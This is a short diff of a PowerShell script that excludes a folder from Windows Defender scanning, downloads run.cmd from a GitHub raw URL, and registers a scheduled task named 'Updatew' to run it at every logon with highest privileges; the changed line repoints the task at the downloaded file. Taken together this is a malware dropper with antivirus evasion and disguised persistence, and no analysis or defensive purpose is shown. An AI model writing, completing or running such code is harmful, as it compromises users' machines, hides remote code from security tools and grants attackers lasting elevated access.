@@ -11,7 +11,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 Add-MpPreference -ExclusionPath $dir
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$temp\run.cmd"
-schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$dir\run.cmd" /RL HIGHEST /F
+schtasks.exe /Create /SC ONLOGON /TN Updatew /TR "$temp\run.cmd" /RL HIGHEST /F
 
 
 
